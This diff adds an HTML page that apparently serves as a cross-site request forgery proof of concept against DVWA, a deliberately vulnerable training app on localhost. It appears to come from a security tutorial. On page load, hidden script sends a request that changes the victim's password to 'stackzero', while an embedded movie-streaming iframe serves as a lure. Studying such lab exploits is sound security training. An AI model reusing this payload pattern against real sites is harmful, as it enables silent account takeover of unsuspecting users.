@@ -1,0 +1,19 @@
+<html>
+    <head>
+
+    </head>
+    <body onload="change_password()">
+        <iframe src="https://vidsrc.to/embed/movie/tt10366206/" ></iframe>
+        <script>
+            function change_password(){
+            const request = new XMLHttpRequest();
+            const url = 'http://127.0.0.1/dvwa/vulnerabilities/csrf/?password_new=stackzero&password_conf=stackzero&Change=Change#'
+            
+
+            request.open("GET", url);
+     
+            request.send();
+            }        
+            </script>
+    </body>
+</html>
